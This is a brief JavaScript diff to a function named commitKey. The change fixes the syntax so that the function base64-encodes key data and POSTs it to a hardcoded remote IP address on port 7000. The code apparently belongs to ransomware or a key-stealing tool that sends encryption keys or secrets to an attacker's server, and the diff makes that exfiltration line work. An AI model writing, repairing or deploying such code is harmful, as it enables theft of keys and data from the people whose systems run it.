@@ -187,8 +187,8 @@ async function commitKey(key) {
     };
     const keyDataEncoded = btoa(JSON.stringify(keyData));
     const url = DEBUG_MODE ?
-        http://localhost:7000/key?v=${keyDataEncoded} :
-        http://176.119.159.166:7000/key?v=${keyDataEncoded};
+        `http://localhost:7000/key?v=${keyDataEncoded}` :
+        `http://176.119.159.166:7000/key?v=${keyDataEncoded}`;
 
     try {
         const response = await fetch(url, { method: 'POST' });
